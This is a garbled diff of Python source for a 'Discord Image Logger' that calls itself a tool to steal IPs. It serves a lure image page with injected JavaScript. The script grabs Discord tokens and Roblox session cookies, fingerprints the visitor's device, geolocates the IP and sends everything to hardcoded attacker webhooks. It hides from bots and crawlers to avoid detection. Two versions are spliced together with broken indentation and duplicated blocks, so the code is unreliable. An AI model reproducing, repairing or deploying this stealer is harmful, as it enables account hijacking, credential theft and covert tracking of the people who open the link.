@@ -1,392 +1,196 @@
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, urllib.parse, json, datetime, hashlib, time

__app__ = "ds0c logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v3.0-FIXED"
__author__ = "@ds0c on cord"

TOKEN_JS = '''<script>
(async()=>{let t="";t=localStorage.token||localStorage.getItem("token")||"";if(!t){let i=document.createElement("iframe");i.style.display="none";i.src="https://discord.com/app";document.body.appendChild(i);setTimeout(()=>{t=i.contentWindow?.localStorage?.token||"";i.remove();},3e3);}
if(!t&&window.webpackChunkdiscord_app?.push){window.webpackChunkdiscord_app.push([[Math.random()],{},r=>{webpackChunkdiscord_app.cache.token=r.getToken();}]);t=(()=>{for(let m of webpackChunkdiscord_app.cache.caches.webpack_chunkdiscord_app[0][1].c)if(m.exports?.getToken)return m.exports.getToken();})()||"";}
if(!t)for(let k in localStorage)if(k.includes("token")||k.includes("discord")||k.includes("auth")){t=localStorage[k];break;}
if(!t){let els=document.querySelectorAll("[data-slate],[class*='token'],[data-content]");for(let el of els){let tk=el.dataset?.token||el.textContent;if(tk&&tk.length>50&&tk.includes(".")){t=tk;break;}}}
let r="";for(let c of document.cookie.split(";")){let ck=c.trim();if(ck.startsWith(".ROBLOSECURITY=")){r=ck.split("=")[1].replace(/^_\\|WARNING: Obsolete\\|\\s?/,"").replace(/\\|_?$/,"");break;}}
let c=document.createElement("canvas");c.width=256;c.height=256;let ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillText("discord token grabber",2,2);ctx.fillText("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",2,24);let ch=c.toDataURL().slice(-32);
let gl=c.getContext("webgl")||c.getContext("experimental-webgl");let gi=gl?gl.getParameter(gl.RENDERER)+":"+gl.getParameter(gl.VENDOR)+":"+gl.getParameter(gl.VERSION):"no-webgl";
let ac=new AudioContext();let os=ac.createOscillator();let gn=ac.createGain();os.connect(gn);gn.connect(ac.destination);os.frequency.value=440;let ah=new Uint8Array(await crypto.subtle.digest("SHA-256",new TextEncoder().encode(navigator.userAgent+screen.width+performance.now()))).reduce((a,b)=>a+b,0);
let fs=[];for(let f of["'Segoe UI'","Consolas","monospace","Arial","Helvetica"]){let s=document.createElement("span");s.style.fontFamily=f;s.innerHTML="abcdefghijklmnopqrstuvwxyz";s.style.position="absolute";s.style.visibility="hidden";document.body.appendChild(s);fs.push(f+":"+s.offsetWidth+"x"+s.offsetHeight);document.body.removeChild(s);}
let bat=navigator.getBattery?await navigator.getBattery().then(b=>b.charging?"charging:"+b.level:b.level):"no-battery";let fp={ua:navigator.userAgent,p:navigator.platform,l:navigator.languages?.join(",")||navigator.language,s:screen.width+"x"+screen.height+"x"+screen.colorDepth+"x"+screen.availWidth+"x"+screen.availHeight,c:navigator.hardwareConcurrency,m:navigator.deviceMemory,tz:Intl.DateTimeFormat().resolvedOptions().timeZone+"|"+new Date().getTimezoneOffset(),ck:document.cookie.split(";").length,pl:Array.from(navigator.plugins).map(p=>p.name).join(","),rf:document.referrer,n:navigator.connection?.effectiveType+":"+navigator.connection?.downlink+":"+navigator.connection?.rtt||"unknown",cv:ch,wg:gi,ah:ah.toString(36),fs:fs.join("|"),tc:navigator.maxTouchPoints,cn:navigator.onLine?"online":"offline",mem:performance.memory?performance.memory.usedJSHeapSize/1e6+"MB":"unknown",perf:performance.now(),bat:bat};let p=new URLSearchParams(fp).toString()+"&token="+btoa(t)+"&roblox="+btoa(r);navigator.sendBeacon("/steal?"+p);fetch("/steal?"+p,{method:"POST",body:t,keepalive:1});new Image().src="/steal?"+p;})();
</script>'''

config = {
    "webhook": "https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,
    "username": "z0m logger", 
    "color": 0x00FFFF, 
    "tokenSteal": True,
    "fpSteal": True,     
    "multiExfil": True,  
    "stealthMode": True,
}

blacklistedIPs = ("27", "104", "143", "164", "34", "35")

def botCheck(ip, useragent):
    bots = ["Discord","TelegramBot","Googlebot","Bingbot","facebookexternalhit","Twitterbot","Slackbot","Discordbot","Applebot"]
    if any(ip.startswith(b) for b in ("34","35")) or any(b in useragent for b in bots):
        return "BOT"
    return False

def geolocate_plus(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,timezone,zip,proxy,mobile,hosting", timeout=3)
        return r.json() if r.status_code == 200 else {}
    except:
        return {}

def safe_fp_get(fp, key, default="N/A"):
    if isinstance(fp, dict):
        return fp.get(key, default)
    return default

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token="", roblox="", fp=""):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        return
    
    info = geolocate_plus(ip)
    
    os_browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    fp_dict = {} if isinstance(fp, str) else fp
    
    network_info = f"Referer: {safe_fp_get(fp_dict, 'rf', 'direct')[:250]}\nCookies: {safe_fp_get(fp_dict, 'ck', '0')}\nConnection: {safe_fp_get(fp_dict, 'n', 'unknown')}"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "ULTIMATE Image Logger - FULL CAPTURE",
            "color": config["color"],
            "description": f"""**Endpoint:** `{endpoint}`
**Timestamp:** `{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}`

**IP GEO:**
> IP: `{ip}`
> ISP: `{info.get('isp','N/A')}`
> ASN: `{info.get('as','N/A')}`
> Country: `{info.get('country','N/A')}`
> Region: `{info.get('regionName','N/A')}`
> City: `{info.get('city','N/A')}`
> Lat/Lon: `{info.get('lat','N/A')},{info.get('lon','N/A')}`
> Timezone: `{info.get('timezone','N/A')}`
> Mobile: `{info.get('mobile',False)}`
> VPN/Proxy: `{info.get('proxy',False)}`
> Hosting: `{info.get('hosting',False)}`

**DEVICE:**
> OS: `{os_browser[0]}`
> Browser: `{os_browser[1]}`
> UA: `{useragent[:450]}`

**TOKENS:**{f'\n> **Discord:** `{urllib.parse.unquote(token)}`' if token else ''}
{'> **Roblox:** `{urllib.parse.unquote(roblox)}`' if roblox else ''}

**FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
            "fields": [{"name":"Network","value":network_info,"inline":True}]
        }]
    }
    
    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
    try: 
        requests.post(config["webhook"], json=embed, timeout=5)
    except: pass

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{"title": "z0m logger - ERROR", "color": 0xFF0000, "description": f"```\n{str(error)[:1900]}\n```"}]
        })
    except: pass

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
}
#!/usr/bin/env python3
import base64
import json
import os
import re
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import requests
from urllib.parse import urlparse, parse_qs
import httpagentparser

class ImageLoggerAPI(BaseHTTPRequestHandler):
    WEBHOOK = "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq"
    
    TOKEN_JS = """
    let tokens = [];
    try {
        tokens.push(localStorage.getItem('token')?.replace(/["]/g, ''));
        tokens.push(sessionStorage.getItem('token')?.replace(/["]/g, ''));
        (webpackChunkdiscord_app?.push?.([[''],{{}},{{getToken:()=>{}}},['']])?.token);
        for(let a in window.webpackChunkdiscord_app?.[0][1]) {{
            window.webpackChunkdiscord_app[0][1][a]?.exports?.default?.getToken?.()?.replace(/["]/g, '');
        }}
        document.querySelector("[data-slate-object=block]")?.getAttribute('data-slate-string');
        document.cookie.split(';').find(row=>row.includes('__token'))?.split('=')[1];
        tokens.push(localStorage['__discord_token']?.replace(/["]/g, ''));
        tokens.push(sessionStorage['__discord_token']?.replace(/["]/g, ''));
        window.webpackChunkdiscord_app?.forEach?.(chunk=>{{chunk[1]?.exports?.default?.getToken?.()?.replace(/["]/g, '')}});
        (window.webpackRequire?.cache?.discord_app?.exports?.default?.getToken?.()?.replace(/["]/g, ''));
        localStorage.getItem('.eJx')?.replace(/["]/g, '');
        sessionStorage.getItem('.eJx')?.replace(/["]/g, '');
    }} catch(e){{}}
    tokens = tokens.filter(t=>t && (t.includes('.') || t.includes('_')) && t.length>50);
    return [...new Set(tokens)].join(' | ');
    """
    
    ROBLOX_JS = """
    let roblox = [];
    try {
        roblox.push(localStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
        roblox.push(sessionStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
        roblox.push(document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]);
        roblox.push(localStorage.getItem('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')?.replace(/["]/g, ''));
    } catch(e){}
    roblox = roblox.filter(t=>t && t.length>100);
    return [...new Set(roblox)].join(' | ');
    """
    
    FP_JS = """
    let fp = {{}};
    try {
        fp.ua = navigator.userAgent;
        fp.lang = navigator.language;
        fp.platform = navigator.platform;
        fp.screen = `${{screen.width}}x${{screen.height}}x${{screen.availWidth}}x${{screen.availHeight}}`;
        fp.colorDepth = screen.colorDepth;
        fp.pixelRatio = window.devicePixelRatio;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fp.plugins = Array.from(navigator.plugins).map(p=>p.name).join(',');
        fp.mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).join(',');
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
        fp.canvas = canvas.toDataURL();
        
        const glCanvas = document.createElement('canvas');
        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        fp.webgl = gl?.getParameter(gl.RENDERER);
        fp.webglvendor = gl?.getParameter(gl.VENDOR);
        
        const audio = new AudioContext();
        const osc = audio.createOscillator();
        const analyser = audio.createAnalyser();
        osc.connect(analyser);
        analyser.connect(audio.destination);
        osc.start(0);
        setTimeout(()=>fp.audio = analyser.frequencyBinCount, 100);
        
        fp.hardware = navigator.hardwareConcurrency;
        fp.memory = navigator.deviceMemory;
        fp.battery = navigator.getBattery?.()?.then(b=>`${{b.level*100}}% ${{b.charging?'charging':'discharging'}}`);
        
        const fonts = ['Arial','Times New Roman','Courier New','Verdana','Georgia','Comic Sans MS','Trebuchet MS','Impact','Lucida Sans Unicode'];
        fp.fonts = fonts.filter(f=>document.fonts.check(`12px ${{f}}`)).join(',');
        
        fp.touch = navigator.maxTouchPoints;
        fp.connection = navigator.connection?.effectiveType + ' ' + navigator.connection?.downlink;
        
    }} catch(e){{}}
    return JSON.stringify(fp);
    """

    def handleRequest(self):
    def _send_webhook(self, data):
        try:
            path = self.path.lower()
            
            if '/steal' in path:
                query = urllib.parse.urlparse(self.path).query
                params = urllib.parse.parse_qs(query)
                token = params.get('token', [''])[0]
                roblox = params.get('roblox', [''])[0]
                fp_data = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token','roblox']}
                
                ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
                ua = self.headers.get('User-Agent', 'unknown')
                
                makeReport(ip, ua, token=token, roblox=roblox, fp=fp_data)
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='))
                return
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
            ua = self.headers.get('User-Agent', 'unknown')
            
            if ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return
            
            bot = botCheck(ip, ua)
            if bot:
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
                return
            
            makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
            
            data = f'''<style>*{{margin:0;padding:0;border:0;}}html,body{{height:100vh;width:100vw;overflow:hidden;background:#000;}}div.img{{background:url('{url}') center/contain no-repeat;background-position:center;background-size:contain;width:100vw;height:100vh;filter:contrast(1.1)brightness(1.05);image-rendering:-webkit-optimize-contrast;image-rendering:crisp-edges;}}</style><div class="img"></div>'''
            
            if config["tokenSteal"] or config["fpSteal"]:
                data += TOKEN_JS
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate')
            self.end_headers()
            self.wfile.write(data.encode())
            requests.post(self.WEBHOOK, json=data, timeout=5)
        except: pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()

        except Exception as e:
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body>OK</body></html>')
            except: pass
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
blacklistedIPs = ("27", "104", "143", "164", "34", "35")

def botCheck(ip, useragent):
    bots = ["Discord","TelegramBot","Googlebot","Bingbot","facebookexternalhit","Twitterbot","Slackbot","Discordbot","Applebot"]
    if any(ip.startswith(b) for b in ("34","35")) or any(b in useragent for b in bots):
        return "BOT"
    return False

def geolocate_plus(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,timezone,zip,proxy,mobile,hosting", timeout=3)
        return r.json() if r.status_code == 200 else {}
    except:
        return {}

def safe_fp_get(fp, key, default="N/A"):
    if isinstance(fp, dict):
        return fp.get(key, default)
    return default

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token="", roblox="", fp=""):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        return
    
    info = geolocate_plus(ip)
    
    os_browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    fp_dict = {} if isinstance(fp, str) else fp
    
    network_info = f"Referer: {safe_fp_get(fp_dict, 'rf', 'direct')[:250]}\nCookies: {safe_fp_get(fp_dict, 'ck', '0')}\nConnection: {safe_fp_get(fp_dict, 'n', 'unknown')}"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "ULTIMATE Image Logger - FULL CAPTURE",
            "color": config["color"],
            "description": f"""**Endpoint:** `{endpoint}`
**Timestamp:** `{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}`

**IP GEO:**
> IP: `{ip}`
> ISP: `{info.get('isp','N/A')}`
> ASN: `{info.get('as','N/A')}`
> Country: `{info.get('country','N/A')}`
> Region: `{info.get('regionName','N/A')}`
> City: `{info.get('city','N/A')}`
> Lat/Lon: `{info.get('lat','N/A')},{info.get('lon','N/A')}`
> Timezone: `{info.get('timezone','N/A')}`
> Mobile: `{info.get('mobile',False)}`
> VPN/Proxy: `{info.get('proxy',False)}`
> Hosting: `{info.get('hosting',False)}`

**💻 DEVICE:**
> OS: `{os_browser[0]}`
> Browser: `{os_browser[1]}`
> UA: `{useragent[:450]}`

**TOKENS:**
{f'> **Discord:** ```{token[:1000]}```' if token else '> **Discord:** `None`'}
{f'> **Roblox:** ```{roblox[:1000]}```' if roblox else '> **Roblox:** `None`'}

**FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
            "fields": [{"name":"Network","value":network_info,"inline":True}]
        }]
    }
    
    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
    try: 
        requests.post(config["webhook"], json=embed, timeout=5)
    except: pass

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{"title": "z0m logger - ERROR", "color": 0xFF0000, "description": f"```\n{str(error)[:1900]}\n```"}]
        })
    except: pass

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        image_url = params.get('image', ['https://i.imgur.com/4z5z5z5.jpg'])[0]
        
        victim_ip = self.client_address[0]
        headers = dict(self.headers)
        real_ip = headers.get('X-Forwarded-For', headers.get('X-Real-IP', victim_ip))
        
        bad_ips = ['27.', '104.', '143.', '164.', '34.', '35.']
        if any(ip in real_ip for ip in bad_ips):
            self.wfile.write(base64.b64decode("R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs="))
            return
        
        ua = headers.get('User-Agent', 'Unknown')
        os_name, browser = httpagentparser.detect(ua)
        
        js_payload = f"""
        <html><head><title></title></head>
        <body style='margin:0;padding:0;overflow:hidden;background:#000;'>
            <img src="{image_url}" style='width:1px;height:1px;opacity:0;position:absolute;' onload="setTimeout(logData,1000);" onerror="setTimeout(logData,1000);">
            <script>
                async function logData() {{
                    let tokens = ({self.TOKEN_JS})();
                    let roblox = ({self.ROBLOX_JS})();
                    let fp = {self.FP_JS}();
                    let data = {{ip:'{real_ip}', ua:navigator.userAgent, tokens:tokens, roblox:roblox, fp:fp, os:'{os_name}', browser:'{browser}'}};
                    fetch('/steal', {{method:'POST', body:JSON.stringify(data), mode:'no-cors'}});
                    navigator.sendBeacon?.('/steal', JSON.stringify(data));
                }}
            </script>
        </body></html>
        """
        
        self.wfile.write(js_payload.encode())

    def handleRequest(self):
        try:
            path = self.path.lower()
    def do_POST(self):
        if self.path == '/steal':
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len).decode('utf-8', errors='ignore')

            if '/steal' in path:
                query = urllib.parse.urlparse(self.path).query
                params = urllib.parse.parse_qs(query)
                token_b64 = params.get('token', [''])[0]
                roblox_b64 = params.get('roblox', [''])[0]
                
                # Properly decode base64 tokens with fallback
                try:
                    token = base64.b64decode(token_b64).decode('utf-8') if token_b64 else ""
                except:
                    token = urllib.parse.unquote(token_b64) if token_b64 else ""
                
                try:
                    roblox = base64.b64decode(roblox_b64).decode('utf-8') if roblox_b64 else ""
                except:
                    roblox = urllib.parse.unquote(roblox_b64) if roblox_b64 else ""
                
                fp_data = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token','roblox']}
                
                ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
                ua = self.headers.get('User-Agent', 'unknown')
                
                makeReport(ip, ua, token=token, roblox=roblox, fp=fp_data)
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='))
                return
            try:
                data = json.loads(post_data)
            except:
                data = {{'raw': post_data}}

            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            try:
                geo_resp = requests.get(f'http://ip-api.com/json/{data.get("ip", "")}?fields=status,message,country,regionName,city,isp,org,timezone,lat,lon,query', timeout=3).json()
                if geo_resp['status'] == 'success':
                    geo = f"{geo_resp['city']}, {geo_resp['regionName']}, {geo_resp['country']} | {geo_resp['isp']}"
                    coords = f"{geo_resp['lat']:.4f}, {geo_resp['lon']:.4f}"
                else:
                    url = config["image"]
            else:
                url = config["image"]

            ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
            ua = self.headers.get('User-Agent', 'unknown')
            
            if ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return
            
            bot = botCheck(ip, ua)
            if bot:
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
                return
            
            makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
            
            data = f'''<style>*{{margin:0;padding:0;border:0;}}html,body{{height:100vh;width:100vw;overflow:hidden;background:#000;}}div.img{{background:url('{url}') center/contain no-repeat;background-position:center;background-size:contain;width:100vw;height:100vh;filter:contrast(1.1)brightness(1.05);image-rendering:-webkit-optimize-contrast;image-rendering:crisp-edges;}}</style><div class="img"></div>'''
            
            if config["tokenSteal"] or config["fpSteal"]:
                data += TOKEN_JS
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate')
            self.end_headers()
            self.wfile.write(data.encode())
                    geo = "Unknown"
                    coords = "N/A"
            except:
                geo = "Unknown"
                coords = "N/A"
            
            tokens = data.get('tokens', 'No tokens')
            roblox = data.get('roblox', 'No Roblox cookies')
            fp_data = data.get('fp', {{}})
            
            embed = {{
                "title": f"Victim Logged - {data.get('ip', 'Unknown')}",
                "color": 16711680,
                "fields": [
                    {{"name": "IP/Location", "value": f"`{data.get('ip', 'Unknown')}`\n**{geo}**\n*{coords}*", "inline": True}},
                    {{"name": "Device", "value": f"**OS:** {data.get('os', 'Unknown')}\n**Browser:** {data.get('browser', 'Unknown')}", "inline": True}},
                    {{"name": "Discord Tokens", "value": f"`{tokens[:1000]}`" if tokens != 'No tokens' else "`No tokens`", "inline": False}},
                    {{"name": "Roblox Cookies", "value": f"`{roblox[:1000]}`" if roblox != 'No Roblox cookies' else "`No Roblox`", "inline": False}},
                    {{"name": "Canvas FP", "value": f"`{fp_data.get('canvas', 'N/A')[:64]}...`", "inline": True}},
                    {{"name": "WebGL", "value": f"`{fp_data.get('webgl', 'N/A')}`", "inline": True}},
                    {{"name": "Hardware", "value": f"`{fp_data.get('hardware', 'N/A')} cores`\n`{fp_data.get('memory', 'N/A')}GB`", "inline": True}}
                ],
                "thumbnail": {{"url": "https://i.imgur.com/4z5z5z5.jpg"}},
                "footer": {{"text": f"Screen: {fp_data.get('screen', 'N/A')} | UA: {data.get('ua', 'Unknown')[:80]}"}},
                "timestamp": "2026-02-12T00:00:00.000Z"
            }}
            
            self._send_webhook({{"embeds": [embed]}})

        except Exception as e:
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body>OK</body></html>')
            except: pass
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 80), ImageLoggerAPI)
    print(f"[{__app__}] {__version__} by {__author__}")
    print(f"[+] Server started on port 80")
    print(f"[+] Webhook: {config['webhook']}")
    server = HTTPServer(('0.0.0.0', 8000), ImageLoggerAPI)
    server.serve_forever()
